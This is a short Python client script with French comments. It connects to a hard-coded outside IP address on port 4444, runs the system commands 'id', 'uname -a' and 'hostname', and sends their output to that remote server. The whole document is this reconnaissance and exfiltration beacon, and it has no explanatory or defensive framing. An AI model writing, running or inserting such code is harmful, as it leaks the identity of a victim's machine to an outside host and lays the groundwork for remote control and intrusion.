import socket
import subprocess

def main():
    # Créer un socket TCP/IP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Se connecter au serveur sur le port 4444
        client_socket.connect(('154.12.234.206', 4444))

        # Recevoir le message de bienvenue du serveur
        welcome_msg = client_socket.recv(1024)
        print("Message du serveur :", welcome_msg.decode('utf-8'))

        # Liste des commandes à exécuter côté client
        commands = ["id", "uname -a", "hostname"]
        for command in commands:
            # Exécuter la commande et envoyer le résultat au serveur
            output = subprocess.getoutput(command)
            client_socket.send(output.encode('utf-8'))

            # Attendre la réponse du serveur
            response = client_socket.recv(1024)
            print(f"Réponse du serveur à la commande '{command}':", response.decode('utf-8'))

    except ConnectionRefusedError:
        print("La connexion au serveur a été refusée.")

    finally:
        # Fermer la connexion avec le serveur
        client_socket.close()

if __name__ == "__main__":
    main()
